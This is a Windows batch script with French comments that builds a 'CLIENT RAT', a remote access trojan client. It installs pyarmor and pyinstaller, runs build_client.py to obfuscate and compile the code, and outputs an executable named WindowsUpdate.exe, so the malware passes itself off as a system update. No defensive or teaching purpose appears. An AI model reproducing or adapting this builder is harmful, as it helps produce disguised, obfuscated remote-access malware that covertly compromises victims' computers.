@echo off
REM Script de build rapide pour Windows

echo ========================================
echo BUILD CLIENT RAT - OBFUSQUE ET COMPILE
echo ========================================
echo.

REM Vérifier Python
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERREUR] Python n'est pas installe ou pas dans le PATH
    pause
    exit /b 1
)

echo [1/4] Installation des dependances de build...
pip install pyarmor pyinstaller --quiet
if errorlevel 1 (
    echo [ERREUR] Installation des dependances echouee
    pause
    exit /b 1
)

echo [2/4] Verification de config.py...
if not exist "config.py" (
    echo [ERREUR] config.py introuvable
    pause
    exit /b 1
)

echo [3/4] Lancement du build...
python build_client.py

echo.
echo [4/4] Build termine!
echo.

if exist "dist\WindowsUpdate.exe" (
    echo ========================================
    echo BUILD REUSSI!
    echo ========================================
    echo.
    echo Executable: dist\WindowsUpdate.exe
    for %%A in ("dist\WindowsUpdate.exe") do echo Taille: %%~zA bytes
    echo.
) else (
    echo [ERREUR] L'executable n'a pas ete cree
    pause
    exit /b 1
)

pause
